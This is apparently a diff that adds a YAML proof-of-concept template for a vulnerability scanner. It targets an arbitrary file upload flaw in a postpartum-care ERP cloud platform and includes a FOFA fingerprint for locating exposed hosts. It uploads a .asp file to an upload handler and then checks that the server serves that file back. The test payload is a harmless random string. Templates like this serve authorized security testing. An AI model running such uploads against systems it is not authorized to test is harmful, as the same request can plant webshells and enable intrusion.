@@ -1,0 +1,31 @@
+id: poc-yaml-jintongfang-erp-uploadcomponent-anyfile-upload
+info:
+  name: 月子会所ERP管理云平台 UploadComponent 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 月子会所ERP管理云平台
+  fofa: app="妈妈宝盒-ERP"
+variables:
+  t1: random_str(5)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /Page/UploadComponent/UploadComponentHandler.ashx
+  headers:
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+  data: '--00content0boundary00
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.asp"
+
+
+    {{.t2}}
+
+    --00content0boundary00--'
+  expression: status_code == 200 && contains(body,".asp")
+  output:
+  - regex_match(body,"\"src\":\"(?P<file>.*?).asp")
+- method: GET
+  path: /{{.file}}.asp
+  expression: status_code == 200 && body == t2
+transport: http
